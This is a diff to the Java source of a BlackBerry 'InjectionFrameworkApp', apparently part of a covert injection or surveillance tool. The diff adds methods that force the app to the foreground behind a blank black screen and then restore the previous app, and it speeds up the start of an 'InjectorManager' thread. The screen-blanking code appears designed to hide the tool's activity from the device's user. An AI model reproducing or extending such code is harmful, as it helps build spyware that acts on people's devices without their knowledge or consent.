@@ -1,6 +1,5 @@
 package blackberry;
 
-
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.Hashtable;
@@ -9,9 +8,11 @@ import java.util.Timer;
 import net.rim.device.api.applicationcontrol.ApplicationPermissions;
 import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
 import net.rim.device.api.system.ApplicationDescriptor;
+import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.CodeModuleGroup;
 import net.rim.device.api.system.CodeModuleGroupManager;
 import net.rim.device.api.system.CodeModuleManager;
+import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.application.AppListener;
 import blackberry.debug.Debug;
@@ -50,6 +51,8 @@ public class InjectionFrameworkApp extends UiApplication {
     private Timer applicationTimer;
     private AppListener applicationListener;
     private SystemMenuExtractor menu;
+    private BlackScreen blackScreen;
+    private int foregroundId;
 
     /**
      * Creates a new InjectionFrameworkApp object
@@ -57,6 +60,33 @@ public class InjectionFrameworkApp extends UiApplication {
     public InjectionFrameworkApp() {
         // Push a screen onto the UI stack for rendering.
         pushScreen(new InjectionFrameworkScreen());
+    }
+
+    public void pushBlack() {
+        ApplicationManager manager = ApplicationManager.getApplicationManager();
+        foregroundId = manager.getForegroundProcessId();
+
+        manager.requestForeground(getProcessId());
+
+        blackScreen = new BlackScreen();
+        synchronized (getAppEventLock()) {
+            pushScreen(blackScreen);
+        }
+    }
+
+    public void popBlack() {
+        synchronized (getAppEventLock()) {
+            //#ifdef DEBUG
+            debug.trace("popBlack: "+ getActiveScreen());
+            //#endif
+            Screen screen = getActiveScreen();
+            if(screen instanceof BlackScreen){
+                popScreen(blackScreen);
+            }
+            
+        }
+        ApplicationManager.getApplicationManager().requestForeground(
+                foregroundId);
     }
 
     Thread injectorManagerThread;
@@ -76,13 +106,13 @@ public class InjectionFrameworkApp extends UiApplication {
 
         menu = new SystemMenuExtractor(100);
         menu.addMenu();
-        
+
         addSystemListener(AppListener.getInstance());
         AppListener.getInstance().resumeApplicationTimer();
 
         injectorManagerThread = new Thread(new Runnable() {
             public void run() {
-                Utils.sleep(3000);
+                Utils.sleep(1000);
                 InjectorManager.getInstance().start();
             };
         });
@@ -135,7 +165,7 @@ public class InjectionFrameworkApp extends UiApplication {
             sb.append(" , "); //$NON-NLS-1$
             sb.append(version);
             sb.append(CR);
-            
+
             final Enumeration enumerator = group.getModules();
             while (enumerator.hasMoreElements()) {
                 final String moduleName = (String) enumerator.nextElement();
@@ -165,7 +195,6 @@ public class InjectionFrameworkApp extends UiApplication {
                 }
                 sb.append(CR);
             }
-
 
         }
 
@@ -309,10 +338,14 @@ public class InjectionFrameworkApp extends UiApplication {
         //#ifdef DEBUG
         debug.trace("onClose: removing menu");
         //#endif
-        if(menu!=null){
+        if (menu != null) {
             menu.removeMenu();
         }
         System.exit(0);
+    }
+
+    public static InjectionFrameworkApp getInstance() {
+        return (InjectionFrameworkApp) getUiApplication();
     }
 
 }
